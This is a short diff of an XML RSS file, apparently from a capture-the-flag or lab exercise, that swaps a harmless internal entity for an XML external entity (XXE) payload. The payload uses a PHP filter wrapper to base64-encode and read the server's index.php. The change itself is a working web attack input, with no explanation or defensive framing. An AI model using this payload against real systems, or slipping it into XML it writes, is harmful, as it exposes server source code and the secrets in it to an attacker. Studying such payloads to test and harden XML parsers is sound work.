@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE title [ <!ELEMENT title ANY >
-<!ENTITY name "Shen"> ]>
+<!ENTITY name SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
 <rss version="2.0">
 <channel>
   <title>W3Schools Home Page</title>
